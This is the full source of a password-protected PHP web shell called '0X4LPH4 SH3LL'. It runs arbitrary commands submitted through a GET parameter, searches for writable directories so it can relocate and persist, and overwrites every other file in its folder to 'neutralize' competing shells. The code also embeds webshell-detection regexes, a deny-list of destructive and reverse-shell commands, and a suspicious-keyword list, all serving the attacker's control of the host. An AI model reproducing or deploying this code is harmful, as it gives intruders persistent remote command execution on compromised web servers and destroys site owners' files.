<?php
// ============= SUPER MOD SECURITY BY 0X4LPH4 =============
$SESSION_TIMEOUT = 1800; // Session timeout in seconds (30 minutes)

session_start();

// ============= LOGIN SYSTEM =============
$DEFAULT_PASSWORD = 'GeoDevz69#'; // Default password

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Check if password was submitted
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $DEFAULT_PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['writable_path'] = dirname(__FILE__); // Set initial writable path
        } else {
            $login_error = "Invalid password!";
        }
    }
    
    // Show login form if not logged in
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Required - 0X4LPH4 Security</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #1a1a1a;
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-image: url('https://i.ibb.co/DDmnztxr/20251208-093450.png');
                    background-size: cover;
                    background-position: center;
                    background-repeat: no-repeat;
                }
                .login-box {
                    background-color: rgba(45, 45, 45, 0.95);
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.8);
                    width: 320px;
                    text-align: center;
                    border: 1px solid #4CAF50;
                }
                .login-box h2 {
                    color: #4CAF50;
                    text-align: center;
                    margin-bottom: 20px;
                    font-size: 24px;
                }
                .login-form {
                    display: flex;
                    flex-direction: column;
                    gap: 15px;
                }
                .login-box input[type="password"] {
                    width: 100%;
                    padding: 12px 10px;
                    border: 1px solid #444;
                    border-radius: 5px;
                    background-color: #333;
                    color: #fff;
                    font-size: 14px;
                    box-sizing: border-box;
                }
                .login-box input[type="submit"] {
                    width: 100%;
                    padding: 12px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 16px;
                    transition: background-color 0.3s;
                }
                .login-box input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .error {
                    color: #ff4444;
                    text-align: center;
                    margin-bottom: 15px;
                    font-size: 14px;
                }
                .brand-title {
                    color: #4CAF50;
                    font-size: 28px;
                    font-weight: bold;
                    margin-bottom: 10px;
                    text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
                }
                .subtitle {
                    color: #aaa;
                    margin-bottom: 25px;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="brand-title">0X4LPH4 SH3LL</div>
                <div class="subtitle">Secure Access Panel</div>
                <?php if (isset($login_error)) echo "<p class='error'>$login_error</p>"; ?>
                <form method="POST" action="" class="login-form">
                    <input type="password" name="password" placeholder="Enter password" required autofocus>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Check session timeout
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Update login time on activity
$_SESSION['login_time'] = time();

// Get current script filename for protection
$current_script = basename(__FILE__);

// Initialize writable path if not set
if (!isset($_SESSION['writable_path'])) {
    $_SESSION['writable_path'] = dirname(__FILE__);
}

// ============= AUTO-BLOCK NON-0X4LPH4 FILES =============
// Check if this is a file access (not the main script)
if (isset($_SERVER['REQUEST_URI'])) {
    $requested_file = basename($_SERVER['REQUEST_URI']);
    $current_script = basename(__FILE__);
    
    // If accessing a file that's not this script
    if ($requested_file !== $current_script && $requested_file !== '' && !preg_match('/index\.php$/i', $_SERVER['REQUEST_URI'])) {
        // Get the actual filename from URL
        $url_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        if ($url_path) {
            $filename = basename($url_path);
            
            // Check if filename starts with 0x4LPH4 (case-insensitive)
            if ($filename !== $current_script && !preg_match('/^0x4lph4\./i', $filename)) {
                // BLOCK ACCESS - Show blank page
                header("HTTP/1.0 404 Not Found");
                echo ""; // Blank page
                exit;
            }
        }
    }
}

// ============= ADVANCED WEBSHELL DETECTION & PROTECTION =============
function scanForWebshells() {
    $current_dir = dirname(__FILE__);
    $current_script = basename(__FILE__);
    
    $webshell_patterns = [
        '/eval\s*\(/i',
        '/base64_decode\s*\(/i',
        '/system\s*\(/i',
        '/shell_exec\s*\(/i',
        '/exec\s*\(/i',
        '/passthru\s*\(/i',
        '/popen\s*\(/i',
        '/proc_open\s*\(/i',
        '/assert\s*\(/i',
        '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
        '/create_function\s*\(/i',
        '/\$_GET\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_POST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_REQUEST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_COOKIE\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/gzuncompress\s*\(\s*base64_decode/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/str_rot13\s*\(/i',
        '/include\s*\(\s*\$_/i',
        '/require\s*\(\s*\$_/i',
        '/include_once\s*\(\s*\$_/i',
        '/require_once\s*\(\s*\$_/i',
        '/`.*`/',
        '/<\?php\s+echo\s+\$_/i',
    ];
    
    $dangerous_extensions = ['.php', '.phtml', '.phps', '.php5', '.php7', '.php4', '.inc', '.pl', '.cgi', '.py', '.sh', '.html', '.htm', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.js', '.css'];
    $webshells_found = [];
    
    $files = scandir($current_dir);
    foreach ($files as $file) {
        $file_path = $current_dir . '/' . $file;
        
        if ($file === $current_script || $file === '.' || $file === '..') {
            continue;
        }
        
        // ============= CRITICAL FIX: BLOCK ALL NON-0X4LPH4 FILES =============
        if (!preg_match('/^0x4lph4\./i', $file)) {
            $webshells_found[] = $file_path;
            
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            
            if (in_array($ext, ['php', 'phtml', 'phps', 'php5', 'php7', 'php4', 'inc'])) {
                // Block PHP files
                $blocked_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
                $blocked_content .= "// ACCESS DENIED - Only 0x4LPH4 files are allowed\n";
                $blocked_content .= "// This file: $file\n";
                $blocked_content .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
                $blocked_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                $blocked_content .= "header('HTTP/1.0 403 Forbidden');\n";
                $blocked_content .= "echo '';\n";
                $blocked_content .= "exit;\n?>";
                
                @file_put_contents($file_path, $blocked_content);
                @chmod($file_path, 0444);
            } else {
                @file_put_contents($file_path, '');
                @chmod($file_path, 0444);
            }
            continue;
        }
        
        // ============= VERIFY 0X4LPH4 FILES CONTENT =============
        if (is_file($file_path)) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $full_ext = '.' . $ext;
            
            if (in_array($full_ext, $dangerous_extensions)) {
                $content = @file_get_contents($file_path);
                if ($content) {
                    // Check for webshell patterns in ALL files
                    foreach ($webshell_patterns as $pattern) {
                        if (preg_match($pattern, $content)) {
                            $webshells_found[] = $file_path;
                            
                            $neutralized_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
                            $neutralized_content .= "// 0x4LPH4 file cleaned - webshell detected\n";
                            $neutralized_content .= "// Detected at: " . date('Y-m-d H:i:s') . "\n";
                            $neutralized_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                            $neutralized_content .= "echo '0X4LPH4 Security - File cleaned';\n";
                            $neutralized_content .= "exit;\n?>";
                            
                            @file_put_contents($file_path, $neutralized_content);
                            @chmod($file_path, 0444);
                            break;
                        }
                    }
                }
            }
        }
    }
    
    return $webshells_found;
}

// ============= FIND WRITABLE PATH FUNCTION =============
function findWritablePaths() {
    $common_paths = [
        '/var/www/html',
        '/home',
        '/tmp',
        '/var/tmp',
        '/opt',
        '/usr/local',
        '/home/*/public_html',
        '/home/*/domains/*/public_html',
        '/home/*/www',
        '/var/www',
        '/srv/http'
    ];
    
    $writable_paths = [];
    
    foreach ($common_paths as $path) {
        if (strpos($path, '*') !== false) {
            // Handle wildcard paths
            $expanded_paths = glob($path, GLOB_ONLYDIR);
            foreach ($expanded_paths as $expanded_path) {
                if (is_writable($expanded_path)) {
                    $writable_paths[] = $expanded_path;
                }
            }
        } else {
            if (is_dir($path) && is_writable($path)) {
                $writable_paths[] = $path;
            }
        }
    }
    
    // Also check current directory and parent directories
    $current_dir = dirname(__FILE__);
    $parent_dirs = [
        $current_dir,
        dirname($current_dir),
        dirname(dirname($current_dir))
    ];
    
    foreach ($parent_dirs as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            $writable_paths[] = $dir;
        }
    }
    
    return array_unique($writable_paths);
}

$detected_webshells = scanForWebshells();
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 20px;
        }
        .header {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #4CAF50;
        }
        .header h1 {
            color: #4CAF50;
            margin: 0;
            font-size: 28px;
        }
        form {
            background-color: #2d2d2d;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #444;
        }
        input[type="text"] {
            width: 70%;
            padding: 10px;
            background-color: #333;
            border: 1px solid #444;
            color: #fff;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #333;
        }
        .info-box {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid #444;
        }
        .logout-btn {
            float: right;
            background-color: #ff4444;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .logout-btn:hover {
            background-color: #cc0000;
        }
        .cmd-error {
            color: #ff6b6b;
        }
        .cmd-success {
            color: #4CAF50;
        }
        .cmd-output {
            color: #ffffff;
        }
        .user-info {
            color: #4CAF50;
            font-weight: bold;
        }
        .wget-fix {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #4CAF50;
        }
        .path-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #2196F3;
        }
        .move-box {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #ff9800;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="?logout" class="logout-btn">Logout</a>
        <h1>0X4LPH4 SH3LL Console</h1>
        <p>Logged in as: <span class="user-info">0X4LPH4</span> | Session timeout: 30 minutes</p>
        
        <?php
        if (isset($_GET['logout'])) {
            session_destroy();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        
        if (!empty($detected_webshells)) {
            echo '<p style="color: #ff4444; font-weight: bold;">Controlled by 0x4LPH4: ' . count($detected_webshells) . ' non-0x4LPH4 files blocked and neutralized!</p>';
        }
        ?>
    </div>
    
    <div class="path-box">
        <strong>📍 CURRENT WRITABLE PATH:</strong><br>
        <?php echo htmlspecialchars($_SESSION['writable_path']); ?><br>
        <strong>To change writable path:</strong> <code>setwritable /new/path/here</code>
    </div>
    
    <div class="move-box">
        <strong>🚀 MOVE 0X4LPH4.PHP TO NEW LOCATION:</strong><br>
        <code>mv 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
        <code>cp 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
        <strong>Example:</strong> <code>mv 0x4LPH4.php /var/www/html/admin/productimages/1005/0x4LPH4.php</code>
    </div>
    
    <div class="wget-fix">
        <strong>🔍 FIND WRITABLE PATHS:</strong><br>
        <code>findwritable</code> - List all writable directories<br>
        <code>testwrite /path/to/test</code> - Test if path is writable
    </div>
    
    <form method="GET" name="cmd_form">
        Command: <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command...">
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    
<pre>
<?php
if (isset($_GET['cmd'])) {
    $command = trim($_GET['cmd']);
    
    if (!empty($command)) {
        $script_name = $current_script;
        
        // ============= SPECIAL COMMANDS =============
        // Handle findwritable command
        if ($command === 'findwritable') {
            $writable_paths = findWritablePaths();
            if (!empty($writable_paths)) {
                echo "<span class='cmd-success'>✓ Found " . count($writable_paths) . " writable paths:</span>\n";
                foreach ($writable_paths as $path) {
                    echo "<span class='cmd-output'>• " . htmlspecialchars($path) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ No writable paths found</span>\n";
            }
            goto end_processing;
        }
        
        // Handle setwritable command
        if (preg_match('/^setwritable\s+(.+)$/i', $command, $matches)) {
            $new_path = trim($matches[1]);
            if (is_dir($new_path) && is_writable($new_path)) {
                $_SESSION['writable_path'] = $new_path;
                echo "<span class='cmd-success'>✓ Writable path changed to: " . htmlspecialchars($new_path) . "</span>\n";
            } else {
                echo "<span class='cmd-error'>✗ Path is not writable or doesn't exist: " . htmlspecialchars($new_path) . "</span>\n";
            }
            goto end_processing;
        }
        
        // Handle testwrite command
        if (preg_match('/^testwrite\s+(.+)$/i', $command, $matches)) {
            $test_path = trim($matches[1]);
            if (is_dir($test_path)) {
                if (is_writable($test_path)) {
                    echo "<span class='cmd-success'>✓ Path is writable: " . htmlspecialchars($test_path) . "</span>\n";
                } else {
                    echo "<span class='cmd-error'>✗ Path is NOT writable: " . htmlspecialchars($test_path) . "</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>✗ Path doesn't exist: " . htmlspecialchars($test_path) . "</span>\n";
            }
            goto end_processing;
        }
        
        // ============= COMMAND VALIDATION =============
        $dangerous_patterns = [
            '/^rm\s+-rf\s+\/\s*$/',
            '/^rm\s+-rf\s+\/etc\s*$/',
            '/^rm\s+-rf\s+\/bin\s*$/',
            '/^rm\s+-rf\s+\/sbin\s*$/',
            '/^rm\s+-rf\s+\/usr\s*$/',
            '/^rm\s+-rf\s+\/var\s*$/',
            '/^rm\s+-rf\s+\/lib\s*$/',
            '/^rm\s+-rf\s+\/boot\s*$/',
            '/^rm\s+-rf\s+\/root\s*$/',
            '/^rm\s+-rf\s+\/home\s*$/',
            '/^rm\s+-rf\s+\/sys\s*$/',
            '/^rm\s+-rf\s+\/proc\s*$/',
            '/^rm\s+-rf\s+\/dev\s*$/',
            '/^rm\s+-rf\s+\/mnt\s*$/',
            '/^rm\s+-rf\s+\/opt\s*$/',
            '/^rm\s+-rf\s+\/srv\s*$/',
            '/^rm\s+-rf\s+\/tmp\s*$/',
            '/rm.*\/etc\/passwd.*/i',
            '/rm.*\/etc\/shadow.*/i',
            '/rm.*\/etc\/group.*/i',
            '/rm.*\/etc\/sudoers.*/i',
            '/rm.*\/etc\/hosts.*/i',
            '/rm.*\/etc\/network.*/i',
            '/rm.*\/var\/log.*/i',
            '/nc\s+.*-e\s+/i',
            '/bash\s+-i\s+>/',
            '/sh\s+-i\s+>/',
            '/dd\s+if=\/dev\/.*of=\/dev\/sda/i',
            '/mkfs\s+/i',
            '/:\(\)\{\s*:\|:\s*\&\s*\};:/',
            '/nmap\s+/i',
            '/nikto\s+/i',
            '/killall\s+/i',
            '/pkill\s+/i',
        ];
        
        $blocked = false;
        $block_reason = '';
        
        $is_download_command = false;
        if (preg_match('/^(wget|curl)\s+/i', $command)) {
            $is_download_command = true;
        }
        
        foreach ($dangerous_patterns as $pattern) {
            if (preg_match($pattern, $command)) {
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - dangerous operation detected";
                $blocked = true;
                break;
            }
        }
        
        // ============= ALLOW MOVING 0X4LPH4 FILES =============
        $is_move_command = preg_match('/^\s*(mv|cp)\s+/i', $command);
        $is_special_command = preg_match('/^(findwritable|setwritable|testwrite)/i', $command);
        
        if (!$blocked && !$is_download_command && !$is_move_command && !$is_special_command) {
            $filename_patterns = [
                '/\b(rm|unlink)\s+\S+\s+([^\s&|;]+)/i'
            ];
            
            foreach ($filename_patterns as $pattern) {
                if (preg_match($pattern, $command, $matches)) {
                    if (count($matches) >= 3) {
                        $target_file = $matches[2];
                    } else {
                        $target_file = end($matches);
                    }
                    $target_filename = basename(trim($target_file, "'\""));
                    
                    if (preg_match('/^0x4lph4\.(php|html|txt)/i', $target_filename)) {
                        $block_reason = "Command blocked, Controlled by 0X4LPH4 - 0x4LPH4 files are protected";
                        $blocked = true;
                        break;
                    }
                }
            }
        }
        
        // ============= ALLOW MOVE/COPY TO NEW PATHS =============
        if (!$blocked && $is_move_command) {
            if (preg_match('/^\s*(mv|cp)\s+([^\s]+)\s+([^\s&|;]+)/i', $command, $matches)) {
                $source_file = $matches[2];
                $target_file = $matches[3];
                $source_filename = basename(trim($source_file, "'\""));
                $target_filename = basename(trim($target_file, "'\""));
                
                // Check if moving 0x4LPH4 file
                if (preg_match('/^0x4lph4\.(php|html|txt)/i', $source_filename)) {
                    // Target must also be 0x4LPH4 file
                    if (!preg_match('/^0x4lph4\.(php|html|txt)/i', $target_filename)) {
                        $block_reason = "Command blocked, Controlled by 0X4LPH4 - 0x4LPH4 files must keep 0x4LPH4 name";
                        $blocked = true;
                    } else {
                        // Update writable path to target directory
                        $target_dir = dirname(trim($target_file, "'\""));
                        if (is_dir($target_dir) && is_writable($target_dir)) {
                            $_SESSION['writable_path'] = $target_dir;
                        }
                    }
                }
            }
        }
        
        if (!$blocked && $is_download_command) {
            if (preg_match('/-O\s+([^\s&|;]+)/i', $command, $matches) || 
                preg_match('/-o\s+([^\s&|;]+)/i', $command, $matches)) {
                $target_file = isset($matches[1]) ? $matches[1] : '';
                $target_filename = basename(trim($target_file, "'\""));
                
                if (!preg_match('/^0x4lph4\.(php|html|txt)/i', $target_filename)) {
                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - Downloaded files must be named 0x4LPH4.php, 0x4LPH4.html, or 0x4LPH4.txt";
                    $blocked = true;
                } else {
                    // Update writable path for downloads
                    $target_dir = dirname(trim($target_file, "'\""));
                    if (is_dir($target_dir) && is_writable($target_dir)) {
                        $_SESSION['writable_path'] = $target_dir;
                    }
                }
            }
        }
        
        if (!$blocked) {
            $suspicious_keywords = [
                'webshell', 'backdoor', 'exploit', 'inject', 'bypass', 'hack',
                'deface', 'crack', 'brute', 'ddos', 'reverse', 'shell',
                'payload', 'wso', 'c99', 'r57', 'b374k', 'c100', 'weevely',
                'rootkit', 'trojan', 'virus', 'malware'
            ];
            
            if (!preg_match('/^\s*(rm|wget|curl|mv|cp|findwritable|setwritable|testwrite)\s+/i', $command)) {
                foreach ($suspicious_keywords as $keyword) {
                    if (stripos($command, $keyword) !== false) {
                        $block_reason = "Command blocked, Controlled by 0X4LPH4 - suspicious keyword detected: $keyword";
                        $blocked = true;
                        break;
                    }
                }
            }
        }
        
        if (!$blocked && strlen($command) > 1000) {
            $block_reason = "Command blocked, Controlled by 0X4LPH4 - command too long";
            $blocked = true;
        }
        
        if (!$blocked) {
            $is_file_operation = preg_match('/^\s*(rm|mv|cp|unlink|ls|cat|head|tail|wget|curl|findwritable|setwritable|testwrite)\s+/i', $command);
            $is_php_execution = preg_match('/php\s+-r\s+[\'"]/i', $command) || 
                               preg_match('/php\s+<\?php/i', $command) ||
                               preg_match('/echo.*<\?php/i', $command);
            
            if (!$is_file_operation && $is_php_execution) {
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - PHP execution detected";
                $blocked = true;
            }
        }
        
        if ($blocked) {
            echo "<span class='cmd-error'>$block_reason</span>\n";
        } else {
            $output = [];
            $return_var = 0;
            
            set_time_limit(8);
            
            exec($command . ' 2>&1', $output, $return_var);
            
            if (!empty($output)) {
                foreach ($output as $line) {
                    if (preg_match('/(command not found|No such file or directory|Permission denied|error:|failed:|cannot)/i', $line)) {
                        echo "<span class='cmd-error'>" . htmlspecialchars($line) . "</span>\n";
                    } else {
                        echo "<span class='cmd-output'>" . htmlspecialchars($line) . "</span>\n";
                    }
                }
            }
            
            if ($return_var !== 0) {
                if (empty($output)) {
                    echo "<span class='cmd-error'>✗ Command failed (exit code: $return_var)</span>\n";
                } else {
                    echo "<span class='cmd-error'>✗ Command exited with status: $return_var</span>\n";
                }
            } else {
                if (empty($output)) {
                    echo "<span class='cmd-success'>✓ Command executed successfully</span>\n";
                } else {
                    echo "<span class='cmd-success'>✓ Command executed successfully</span>\n";
                }
            }
        }
        
        end_processing:
        
        $new_webshells = scanForWebshells();
        if (!empty($new_webshells)) {
            echo "\n<span class='cmd-error'>Controlled by 0x4LPH4: " . count($new_webshells) . " non-0x4LPH4 files blocked and neutralized!</span>\n";
        }
    }
}
?>
</pre>
    
    <div class="info-box">
        <h3>System Information</h3>
        <?php
        echo "Script: " . $current_script . "<br>";
        echo "PHP Version: " . phpversion() . "<br>";
        echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
        echo "Current Directory: " . getcwd() . "<br>";
        echo "<strong>Current Writable Path:</strong> " . htmlspecialchars($_SESSION['writable_path']) . "<br>";
        echo "<strong>PROTECTED:</strong> 0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt<br>";
        echo "<strong>BLOCKED:</strong> ALL other files (cmd.php, etc.)<br>";
        
        if (!empty($detected_webshells)) {
            echo "Non-0x4LPH4 files blocked: " . count($detected_webshells) . "<br>";
        }
        
        echo "<br><strong>SPECIAL COMMANDS:</strong><br>";
        echo "• <code>findwritable</code> - Find all writable directories<br>";
        echo "• <code>setwritable /new/path</code> - Set new writable path<br>";
        echo "• <code>testwrite /path</code> - Test if path is writable<br>";
        
        echo "<br><strong>MOVE 0X4LPH4 FILES:</strong><br>";
        echo "• <code>mv 0x4LPH4.php /var/www/html/new/path/0x4LPH4.php</code><br>";
        echo "• <code>cp 0x4LPH4.php /home/user/public_html/0x4LPH4.php</code><br>";
        echo "• <code>mv 0x4LPH4.txt /tmp/0x4LPH4.txt</code><br>";
        
        echo "<br><strong>WRITABLE PATH WILL AUTO-UPDATE:</strong><br>";
        echo "1. When you move 0x4LPH4 file<br>";
        echo "2. When you download to new path<br>";
        echo "3. Current writable: " . htmlspecialchars($_SESSION['writable_path']) . "<br>";
        
        echo "<br><strong>COMMON PATHS TO TRY:</strong><br>";
        echo "• /var/www/html/admin/productimages/1005/<br>";
        echo "• /home/*/public_html/<br>";
        echo "• /home/*/domains/*/public_html/<br>";
        echo "• /tmp/<br>";
        echo "• /var/tmp/<br>";
        ?>
    </div>
</body>
</html>
